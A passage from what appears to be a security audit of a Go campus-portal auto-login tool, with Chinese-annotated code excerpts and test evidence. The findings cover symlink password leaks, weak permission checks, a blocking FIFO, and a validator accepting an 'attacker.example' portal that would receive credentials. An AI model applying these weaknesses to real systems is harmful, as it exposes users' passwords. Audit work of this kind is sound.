		c.Accounts[0].PasswordSource = SourceFile
		return ""
	}

// config.go:741-747  唯一一处"校验"：只要求 scheme 与 host
func ValidHTTPURL(raw string) bool {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil { return false }
	return (u.Scheme == "http" || u.Scheme == "https") && u.Host != ""
}

// passwordfile.go:30-40  splitLines：无 BOM 处理，\r 只去行尾
func splitLines(data []byte) []string {
	text := strings.TrimSuffix(string(data), "\n")
	if text == "" { return nil }
	lines := strings.Split(text, "\n")
	for i := range lines { lines[i] = strings.TrimSuffix(lines[i], "\r") }
	return lines
}

// passwordfile.go:49-63  判形：任意一行含冒号即整体按列表解析
	for _, l := range lines { if strings.Contains(l, ":") { named = true; break } }
	if !named {
		if len(lines) == 0 || lines[0] == "" { return nil, "", fmt.Errorf("holds no password") }
		return nil, lines[0], nil
	}

// passwordfile.go:66-85  列表解析：缺冒号 => 整文件拒绝；重复名拒绝
		name, secret, ok := strings.Cut(l, ":")
		if !ok { return nil, "", fmt.Errorf("line %d holds no colon while the others name an account", i+1) }
		name = strings.TrimSpace(name)
		switch {
		case name == "":   return nil, "", fmt.Errorf("line %d names no account", i+1)
		case secret == "": return nil, "", fmt.Errorf("line %d gives %s no password", i+1, name)
		case seen[name]:   return nil, "", fmt.Errorf("line %d names %s a second time", i+1, name)
		}

// protect_other.go:18-34  只看 mode 位
	info, err := os.Stat(path)
	if err != nil { return "" }
	mode := info.Mode().Perm()
	if mode&0o077 == 0 { return "" }
	if err := os.Chmod(path, configFileMode); err != nil { ... }

// protect_windows.go:15-34  进程令牌 + 单 ACE + PROTECTED_DACL（机制正确）
	user, err := windows.GetCurrentProcessToken().GetTokenUser()
	acl, err := windows.ACLFromEntries([]windows.EXPLICIT_ACCESS{{
		AccessPermissions: windows.GENERIC_ALL, AccessMode: windows.GRANT_ACCESS, ...}}, nil)
	return windows.SetNamedSecurityInfo(path, windows.SE_FILE_OBJECT,
		windows.DACL_SECURITY_INFORMATION|windows.PROTECTED_DACL_SECURITY_INFORMATION, nil, nil, acl, nil)
```

```
# 实测证据（真实 Go 1.26.0，/tmp/audit-A 副本）
C: symlink target got the plaintext password: true ; target mode now 0600
MkdirAll through a symlinked directory: err=<nil>
Save through the link: err=<nil> ; file landed in the linked directory: true
directory mode=0777 file mode=0600            -> Protect() report=""
password file mode=0644 notice="" password loaded="topsecret"   -> Protect() report=""
before 703 bytes -> Save error=... file too large -> after 1024 bytes -> LoadConfig: unexpected end of JSON input
notice="" attempts=1 source="file"
  would submit as user_password: username="s1" password="-----BEGIN OPENSSH PRIVATE KEY-----"
A: field absent from the request -> in-memory="runonly" source="config" saved-run-only=true
B: empty password posted        -> in-memory="runonly" source="config" saved-run-only=true
Validate() with an attacker portal = map[]
ValidHTTPURL("http://attacker.example/") = true ; ("http://10.9.1.3:801/eportal/#") = true
load path: portalBaseUrl="not a url at all" eportalUrl="ftp://x/" accountPrefix=""
user_account submitted="s1"
LoadPasswords is still blocked after 3s on a FIFO with no writer
go test ./internal/config/ (既有测试): ok sdautologin/internal/config 3.013s
```
